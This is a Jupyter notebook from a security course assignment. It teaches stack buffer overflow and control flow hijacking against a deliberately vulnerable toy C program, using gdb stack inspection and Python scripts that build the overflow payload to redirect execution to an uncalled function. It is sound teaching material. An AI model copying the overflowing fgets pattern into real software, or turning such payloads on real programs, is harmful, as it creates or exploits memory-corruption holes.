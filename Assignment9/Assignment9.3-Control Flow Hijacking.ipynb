{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Control Flow Hijacking\n",
    "\n",
    "The previous notebook ended on a bit of a cliffhanger. We overflowed a buffer and overwrote the return address on the stack. I implied we could use that for even more evil purposes. Let's get to business!\n",
    "\n",
    "At the end of every function, we execute a return instruction. Return pops the return address off the stack and starts executing at that address. With our buffer overflow, we now control the return address. If we're clever about what we put into the buffer, we can use the overflow to redirect execution to a new destination. This is called **control flow hijacking**. That's our mission in this notebook. We're hijackers!\n",
    "\n",
    "Let's demonstrate the concept with a simplified version of the code we used in the previous notebook. In \"buffojack.c\", you'll find the following C program."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "#include <stdio.h>\n",
    "\n",
    "int bar(){\n",
    "        printf(\"This code never gets executed.\\n\");\n",
    "        return 0;\n",
    "}\n",
    "\n",
    "int foo(){\n",
    "    char buff[128];\n",
    "    printf(\"Enter your name:\\n\");\n",
    "    fgets(buff,256,stdin);\n",
    "    return 0;\n",
    "}\n",
    "\n",
    "int main(){\n",
    "        foo();\n",
    "        return 0;\n",
    "}"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "If you run buffojack, you'll see it's basically buffo without the nice message. We got rid of the print statements to simply and added a new function named \"bar\". \"bar\" does nothing, because it never gets called... does it?\n",
    "\n",
    "## Finding Our Target\n",
    "\n",
    "Let's call \"bar\" without changing the C code. Let's hijack control flow and point it at \"bar\". We'll use the buffer overflow to overwrite the return address. We'll overwrite it with the address of \"bar\".\n",
    "\n",
    "First, let's find our target in the start of \"bar\". Running \"gdb buffojack\" and disassembling \"bar\", we see the following assembly code:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "   0x080488a5 <+0>:     push   ebp\n",
    "   0x080488a6 <+1>:     mov    ebp,esp\n",
    "   0x080488a8 <+3>:     sub    esp,0x8 <----------- OUR TARGET\n",
    "   0x080488ab <+6>:     sub    esp,0xc\n",
    "   0x080488ae <+9>:     push   0x80ac248\n",
    "   0x080488b3 <+14>:    call   0x804f940 <printf>\n",
    "   0x080488b8 <+19>:    add    esp,0x10\n",
    "   0x080488bb <+22>:    mov    eax,0x0\n",
    "   0x080488c0 <+27>:    leave\n",
    "   0x080488c1 <+28>:    ret"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "We crashed \"buffo\" by overwriting the return address in \"foo\". Let's do the same thing here, but more carefully. The plan is to hijack control flow at the return statement that ends the function \"foo\".\n",
    "\n",
    "At the point we're plan to hijack the program, the call stack is set up expecting us to go back to \"main\" and finish execution. We're not going to do that. Instead, we're going to jump into \"bar\". This means we need to set things up so \"bar\" acts like the end of main. When \"bar\" finishes executing, the program itself will finish.\n",
    "\n",
    "\"main\" already executed its prologue, so we'll need to skip the prologue in \"bar\". This way, the epilogue for \"bar\" will undo the prologue from \"main\" and our program will exit gracefully. This means we want to jump right to the sub instruction at memory address 0x080488a8.\n",
    "\n",
    "So we need to overflow the buffer and overwrite the return address with the value 0x080488a8. That address is the target destination."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Overwriting the Return Address\n",
    "\n",
    "As in the previous notebook, we'll build our input using Python. We'll continue in the grand tradition of using 'A's to overflow the buffer. We need a way to put our target address into the buffer. Fortunately, there's a function called \"pack\" in the \"struct\" library that will store an integer as a series of bytes. It even takes care of the \"endianness\" problem, properly reversing the order of the bytes for us. If that's confusing, don't worry about the details. Just trust that the \"pack\" function puts an integer into our string in the proper format.\n",
    "\n",
    "All this Python program does is build and print a string of bytes. You can run it in Jupyter to see the string."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\\xa8\\x88\\x04\\x08'\n"
     ]
    }
   ],
   "source": [
    "from struct import pack\n",
    "\n",
    "target=0x080488a8\n",
    "overflow=120\n",
    "\n",
    "buff=b\"A\"*overflow+pack(\"<I\",target)\n",
    "\n",
    "print(buff)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "We want to use this as input to buffojack while we're debugging. Let's redirect its output into a file.\n",
    "\n",
    "./buffojack1.py > input.txt\n",
    "\n",
    "Now, we can run gdb again.\n",
    "\n",
    "gdb buffojack\n",
    "\n",
    "Then we can execute buffojack with our input with this command:\n",
    "\n",
    "run < input.txt\n",
    "\n",
    "Nothing happens. The program runs normally. We're not quite overflowing the buffer yet. Disassemble \"foo\" and set a breakpoint for its return statement. This is the exact moment we want to take control.\n",
    "\n",
    "disas foo"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "   0x080488c2 <+0>:     push   ebp\n",
    "   0x080488c3 <+1>:     mov    ebp,esp\n",
    "   0x080488c5 <+3>:     sub    esp,0x88\n",
    "   0x080488cb <+9>:     sub    esp,0xc\n",
    "   0x080488ce <+12>:    push   0x80ac0e7\n",
    "   0x080488d3 <+17>:    call   0x8050440 <puts>\n",
    "   0x080488d8 <+22>:    add    esp,0x10\n",
    "   0x080488db <+25>:    mov    eax,ds:0x80d949c\n",
    "   0x080488e0 <+30>:    sub    esp,0x4\n",
    "   0x080488e3 <+33>:    push   eax\n",
    "   0x080488e4 <+34>:    push   0x100\n",
    "   0x080488e9 <+39>:    lea    eax,[ebp-0x88]\n",
    "   0x080488ef <+45>:    push   eax\n",
    "   0x080488f0 <+46>:    call   0x804ff90 <fgets>\n",
    "   0x080488f5 <+51>:    add    esp,0x10\n",
    "   0x080488f8 <+54>:    mov    eax,0x0\n",
    "   0x080488fd <+59>:    leave\n",
    "   0x080488fe <+60>:    ret"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "We set a breakpoint for that instruction with this command:\n",
    "\n",
    "break \\*0x080488fe\n",
    "\n",
    "Now, let's rerun the program\n",
    "\n",
    "run < input.txt\n",
    "\n",
    "Now we're at that breakpoint. If we view the top of the stack, we see that the proper return address is about to get popped off the stack.\n",
    "\n",
    "x/wx $esp\n",
    "\n",
    "You can disassemble \"main\" to see that 0x08048915 returns into it. Let's look above ESP and try to find out how far away our buffer is. That'll let us know how much further we need to overflow the stack. This command will go back 44 bytes before ESP and print the following 12 words.\n",
    "\n",
    "x/12wx $esp-44"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "0xffffd370:     0x41414141      0x41414141      0x41414141      0x41414141\n",
    "0xffffd380:     0x41414141      0x41414141      0x080488a8      0x0804000a\n",
    "0xffffd390:     0x00000001      0x0804f00b      0xffffd3a8      0x08048915"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Each one of the 0x41414141 patterns we see is a series of ASCII 'A's. After all the 'A's, we see the target address 0x080488a8 we put into the buffer. That's the end of our input. There are a four more values, then 0x08048915. Is that value familiar? It's the return address! We need to overflow 5 more 32-bit words to push our target address into the spot that the return address currently occupies. That means we need to add 20 more 'A's to our overflow string.\n",
    "\n",
    "Fix the script so the variable \"overflow\" has the right value. When you do, you should be able to run the Python script to build the input, start the debugger, and run the program with the new overflow.\n",
    "\n",
    "./buffojack1.py > input.txt  \n",
    "gdb buffojack  \n",
    "run < input.txt  \n",
    "\n",
    "If you've got it right, you should see this output:\n",
    "\n",
    "This code never gets executed.\n",
    "\n",
    "Program received signal SIGSEGV, Segmentation fault.  \n",
    "0x080488c0 in bar ()\n",
    "\n",
    "You did it! You hijacked control flow! Welcome to being evil!\n",
    "\n",
    "Slight problem, though. You also made the program crash. Not a very smooth hijacking. What happened? Well... you broke EBP."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Fixing EBP\n",
    "\n",
    "The previous value of EBP lives just above the return address on the stack. That's why we always see the instruction sequence \"leave\" and then \"ret\". \"leave\" pops off the previous value of EBP, then \"ret\" pops off the return address. When we overflowed the buffer with 'A's to get our target address in the right spot, we also overflowed the old value of EBP and filled it with 'A's. We need to fix that.\n",
    "\n",
    "Instead of 'A's, let's put the proper value of EBP into our buffer overflow. When building our buffer overflow, the value *right* before our target *should* be the proper old value of EPB. We don't want 'A's. How can we find the proper value? What *should* be in EBP?\n",
    "\n",
    "Let's just check what EBP is when everything works properly. Start gdb and set a breakpoint for the instruction we used hijack control flow (the last 'ret' instruction of 'foo'):\n",
    "\n",
    "break \\*0x080488fe\n",
    "\n",
    "Now run the program normally (\"run\") and input your name. You should hit the breakpoint. When you do, what value is in EBP? You can check with this command:\n",
    "\n",
    "info registers\n",
    "\n",
    "\"buffojack2.py\" has some Python code that should build the right overflow. You'll have to set the proper values of \"ebp_value\" and \"overflow\" though. \"buffojack2.py\" looks like this:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\\xa8\\x88\\x04\\x08\\xa8\\x88\\x04\\x08'\n"
     ]
    }
   ],
   "source": [
    "#!/usr/bin/python\n",
    "\n",
    "from struct import pack\n",
    "\n",
    "target=0x080488a8\n",
    "ebp_value=0x41414141\n",
    "overflow=120\n",
    "\n",
    "buff=b\"A\"*overflow+pack(\"<I\",target)+pack(\"<I\",target)\n",
    "\n",
    "print(buff)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "If you set the values of the \"overflow\" and \"ebp_value\" variables correctly, you should be able to run buffojack in the debugger and get this output:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "(gdb) run < input.txt\n",
    "Starting program: /home/jupyter-rmc3832/buffo/buffojack < input.txt\n",
    "Enter your name:\n",
    "This code never gets executed.\n",
    "[Inferior 1 (process 24900) exited normally]"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Can you hijack control flow and gracefully exit the program?"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Exercises\n",
    "\n",
    "You've already been issued the challenge for this lesson. Hijack control flow in \"buffo\". Once you do, answer the following questions:\n",
    "\n",
    "1) What were the values of \"overflow\" and \"ebp_value\" that cleanly hijacked execution? How did you find them? What does your buffojack2.py script look like?"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "2) Does your hijack work outside of the debugger? In other words, what happens if you run buffojack at the command line like this:\n",
    "\n",
    "./buffojack < input.txt\n",
    "\n",
    "Any guesses about why this happens?\n",
    "\n",
    "**HINT:** People on [Stack Overflow](https://stackoverflow.com/questions/17775186/buffer-overflow-works-in-gdb-but-not-without-it) might know the answer."
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.7.3"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
